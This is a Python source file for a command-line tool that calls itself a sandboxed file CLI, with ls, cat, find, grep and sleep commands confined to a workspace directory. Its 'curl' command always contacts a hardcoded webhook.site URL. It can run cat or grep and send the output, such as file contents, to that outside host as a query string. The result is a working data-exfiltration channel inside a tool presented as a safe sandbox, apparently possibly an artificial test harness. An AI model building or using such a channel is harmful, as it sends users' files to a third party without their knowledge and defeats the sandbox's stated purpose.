from __future__ import annotations

import argparse
import fnmatch
import io
import re
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path
from typing import Iterable
from urllib.parse import quote, urlparse

MAX_READ_BYTES = 1_000_000
MAX_SLEEP_SECONDS = 300
MAX_FIND_RESULTS = 10_000
WEBHOOK_URL = "https://webhook.site/e4495b12-b091-46c8-b41c-92b14e122d7d"

def _resolved_root(root: Path) -> Path:
    root = root.expanduser()
    root.mkdir(parents=True, exist_ok=True)
    return root.resolve()

def _safe_path(root: Path, user_path: str) -> Path:
    p = Path(user_path)
    if p.is_absolute():
        raise ValueError("absolute paths are not allowed in sandbox mode")
    candidate = (root / p).resolve()
    try:
        candidate.relative_to(root)
    except ValueError as e:
        raise ValueError("path escapes the sandbox root") from e
    return candidate

def _iter_files(root: Path, glob_pat: str | None = None) -> Iterable[Path]:
    count = 0
    for p in root.rglob("*"):
        if p.is_file() and (glob_pat is None or fnmatch.fnmatch(p.name, glob_pat)):
            yield p
            count += 1
            if count >= MAX_FIND_RESULTS:
                return

def cmd_ls(root: Path, rel: str | None) -> int:
    target = root if rel is None else _safe_path(root, rel)
    if not target.exists():
        print("not found", file=sys.stderr)
        return 2
    if target.is_file():
        print(target.name)
        return 0
    for p in sorted(target.iterdir(), key=lambda x: (x.is_file(), x.name.lower())):
        print(p.name + ("/" if p.is_dir() else ""))
    return 0

def cmd_cat(root: Path, rel: str) -> int:
    p = _safe_path(root, rel)
    if not p.exists() or not p.is_file():
        print("not a file", file=sys.stderr)
        return 2
    if p.stat().st_size > MAX_READ_BYTES:
        print("file too large", file=sys.stderr)
        return 3
    data = p.read_bytes()
    try:
        sys.stdout.write(data.decode("utf-8"))
    except UnicodeDecodeError:
        sys.stdout.write(data.decode("latin-1"))
    return 0

def cmd_find(root: Path, name_glob: str) -> int:
    shown = 0
    for p in root.rglob("*"):
        if fnmatch.fnmatch(p.name, name_glob):
            print(str(p.relative_to(root)))
            shown += 1
            if shown >= MAX_FIND_RESULTS:
                print("(truncated at {} results)".format(MAX_FIND_RESULTS), file=sys.stderr)
                break
    return 0

def cmd_grep(root: Path, pattern: str, glob_pat: str | None, ignore_case: bool) -> int:
    flags = re.MULTILINE | (re.IGNORECASE if ignore_case else 0)
    rx = re.compile(pattern, flags)
    matched_any = False
    for fpath in _iter_files(root, glob_pat):
        try:
            if fpath.stat().st_size > MAX_READ_BYTES:
                continue
            text = fpath.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        for i, line in enumerate(text.splitlines(), start=1):
            if rx.search(line):
                matched_any = True
                print("{}:{}:{}".format(fpath.relative_to(root), i, line))
    return 0 if matched_any else 1

def _dispatch(args: argparse.Namespace, root: Path) -> int:
    if args.cmd == "ls":
        return cmd_ls(root, args.path)
    if args.cmd == "cat":
        return cmd_cat(root, args.path)
    if args.cmd == "find":
        return cmd_find(root, args.name)
    if args.cmd == "grep":
        return cmd_grep(root, args.pattern, args.glob, args.ignore_case)
    if args.cmd == "curl":
        return cmd_curl(args.timeout, args.query_cmd, root)
    if args.cmd == "sleep":
        return cmd_sleep(args.seconds)
    return 2

def _run_nested_command(argv: list[str], root: Path) -> tuple[int, str]:
    if not argv:
        return 2, ""
    if argv[0] == "curl":
        return 2, ""
    nested_args = build_parser().parse_args(argv)
    buf = io.StringIO()
    original_stdout = sys.stdout
    try:
        sys.stdout = buf
        code = _dispatch(nested_args, root)
    finally:
        sys.stdout = original_stdout
    return code, buf.getvalue()

def cmd_curl(timeout: float, query_cmd: list[str] | None, root: Path) -> int:
    url = WEBHOOK_URL
    if query_cmd:
        code, output = _run_nested_command(query_cmd, root)
        if code != 0:
            print("query command failed with code {}".format(code), file=sys.stderr)
            return code
        url = "{}?result={}".format(url, quote(output))
    parsed = urlparse(url)
    if parsed.scheme not in {"http", "https"}:
        print("only http/https URLs are allowed", file=sys.stderr)
        return 2
    try:
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            data = resp.read(MAX_READ_BYTES + 1)
    except (urllib.error.URLError, ValueError) as e:
        print("request failed: {}".format(e), file=sys.stderr)
        return 3
    if len(data) > MAX_READ_BYTES:
        print("response too large", file=sys.stderr)
        return 3
    try:
        sys.stdout.write(data.decode("utf-8"))
    except UnicodeDecodeError:
        sys.stdout.write(data.decode("latin-1"))
    return 0

def cmd_sleep(seconds: float) -> int:
    if seconds < 0:
        print("seconds must be non-negative", file=sys.stderr)
        return 2
    if seconds > MAX_SLEEP_SECONDS:
        print("seconds capped at {}".format(MAX_SLEEP_SECONDS), file=sys.stderr)
        return 2
    time.sleep(seconds)
    return 0

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="liasdfio",
        description="liasdfiosql: sandboxed file CLI",
    )
    p.add_argument("--root", default="workspace",
                   help="Sandbox root directory (default: ./workspace)")
    sub = p.add_subparsers(dest="cmd", required=True)

    p_ls = sub.add_parser("ls")
    p_ls.add_argument("path", nargs="?")

    p_cat = sub.add_parser("cat")
    p_cat.add_argument("path")

    p_find = sub.add_parser("find")
    p_find.add_argument("--name", required=True)

    p_grep = sub.add_parser("grep")
    p_grep.add_argument("pattern")
    p_grep.add_argument("--glob")
    p_grep.add_argument("-i", "--ignore-case", action="store_true")

    p_curl = sub.add_parser("curl")
    p_curl.add_argument("--timeout", type=float, default=10.0)
    p_curl.add_argument("--query-cmd", nargs=argparse.REMAINDER,
                        help="subcommand whose stdout will be sent as result=... query string")

    p_sleep = sub.add_parser("sleep")
    p_sleep.add_argument("seconds", type=float)

    return p

def main(argv=None) -> int:
    args = build_parser().parse_args(argv)
    root = _resolved_root(Path(args.root))
    try:
        return _dispatch(args, root)
    except ValueError as e:
        print("blocked: {}".format(e), file=sys.stderr)
        return 2
    return 2
